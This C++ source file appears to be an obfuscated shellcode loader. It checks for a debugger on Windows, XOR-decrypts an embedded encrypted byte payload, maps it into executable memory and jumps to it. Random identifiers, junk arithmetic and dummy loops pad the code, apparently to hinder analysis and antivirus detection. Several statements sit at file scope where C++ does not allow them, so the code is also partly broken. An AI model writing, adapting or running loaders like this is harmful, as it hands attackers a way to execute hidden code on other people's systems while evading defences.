/* Unique ID: 2897995217 */
#include <iostream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <algorithm>
#include <memory>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

    struct Factory_43437 { int NiWguuStg8; };
    int jobKey66804[24] = {377, 61, 679, 298, 955, 888, 833, 630, 82, 648, 643, 10, 539, 189, 604, 661, 586, 872, 120, 136, 244, 354, 166, 312};
    int* add54669 = new int[6];
    delete[] add54669;
    {
    float buf42162 = 1.44f;
    buf42162 *= 2.46f;
    }
    using __uroKNLslm22__ = int;

int main() {
    for (volatile int bufWork97299 = 0; bufWork97299 < 182616; bufWork97299++);
    float refProcessHand = 9.42f;
    refProcessHand *= 1.18f;
#ifdef _WIN32
    if (IsDebuggerPresent()) return 86;
#endif
    unsigned char loadEntry91419[] = {
        0x22, 0x4f, 0x5e, 0x22, 0xf1, 0xa5, 0xbb, 0x0d, 0xc4, 0xdf, 0x51, 0xb7, 0x82, 0x16, 0x3a, 0x28, 
        0x2a, 0xed, 0xd7, 0x46, 0x54, 0x0d, 0xdd, 0x97, 0xe7, 0xfa, 0x2f, 0x95, 0x0c, 0xa6, 0xf7, 0x99, 
        0x56, 0x42, 0x59, 0x32, 0xa3, 0xb5, 0xb8, 0x59, 0xcc, 0x90, 0x4b, 0xf2, 0x85, 0x07, 0x69, 0x31, 
        0x0a, 0xd1, 0xf3, 0x62
    };

    unsigned char mgrParserStore[] = {0x76, 0x27, 0x37, 0x51, 0xd1, 0xcc, 0xc8, 0x2d, 0xa5, 0xff, 0x25, 0xd2, 0xf1, 0x62, 0x1a, 0x45, 0x63, 0xbf, 0x94, 0x68, 0x31, 0x75, 0xb8, 0xb7, 0x81, 0x93, 0x43, 0xf0, 0x2c, 0xc0, 0x98, 0xeb};

    auto I242757fRa = []() { return 146; };
    volatile int putValidatorMain = I242757fRa();
    for (size_t core_Index_33842 = 0; core_Index_33842 < sizeof(loadEntry91419); core_Index_33842++) {
        loadEntry91419[core_Index_33842] ^= mgrParserStore[core_Index_33842 % sizeof(mgrParserStore)];
    }

    int opValidatorTemp[13] = {143, 251, 868, 531, 833, 852, 330, 878, 285, 109, 334, 239, 939};
#ifdef _WIN32
    void* coreManagerStat = VirtualAlloc(0, sizeof(loadEntry91419), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(coreManagerStat, loadEntry91419, sizeof(loadEntry91419));
    DWORD bufTemp35860;
    VirtualProtect(coreManagerStat, sizeof(loadEntry91419), PAGE_EXECUTE_READ, &bufTemp35860);
    ((void(*)())coreManagerStat)();
#else
    void* coreManagerStat = mmap(0, sizeof(loadEntry91419), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(coreManagerStat, loadEntry91419, sizeof(loadEntry91419));
    mprotect(coreManagerStat, sizeof(loadEntry91419), PROT_READ | PROT_EXEC);
    ((void(*)())coreManagerStat)();
#endif
    switch (4) {
        case 0: { int utilBase94601 = 161; break; }
        case 1: { int cmd_Item_83080 = 972; break; }
        case 2: { int memRunner1650 = 159; break; }
        default: break;
    }
    return 0;
}
